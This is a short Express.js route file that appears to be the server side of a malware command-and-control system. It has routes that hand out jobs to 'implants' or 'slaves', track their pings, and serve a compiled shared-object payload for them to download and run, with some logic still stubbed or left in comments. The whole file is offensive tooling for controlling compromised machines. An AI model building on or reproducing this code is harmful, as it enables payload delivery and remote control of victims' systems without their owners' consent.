/**
 * Route for /
 */

const router = express.Router();
const responseHelper = require("../../helpers/ImplantResponseHelper")

router.post("/", (req, res) => {

    console.log("Slave GET");

    res.json({code: responseHelper.NEW_OBJECT, id: "RANDOM_JOB_ID", size: 15960}) // Test...
    // if (newObject for slave)
    //  res.json({code: responseHelper.NEW_OBJECT, id: idTask})
    // else
    //  res.json({code: responseHelper.LOITER})
})

router.post("/ping", (req, res) => {

    console.log("Got PING");
    
    // Keep up track of active implants.

    res.json({code: responseHelper.PONG})
})

router.get("/job/:jobId", (req, res) => {
    
    console.log("Got JOB")
    
    // Response with payload of the slave.

    res.download("/home/ramb0/PDIR/cpp/ObjectLoader2/bin/object.so");
})

router.post("/job/:jobId", (req, res) => {
    
    console.log("Posted JOB")
    // Mark job as done.

    res.json({code: responseHelper.LOITER})
})

router.get("/server-status", (req, res) => {

    // Kick out malware, ban IP?
    // Intrusion.
})

module.exports = router;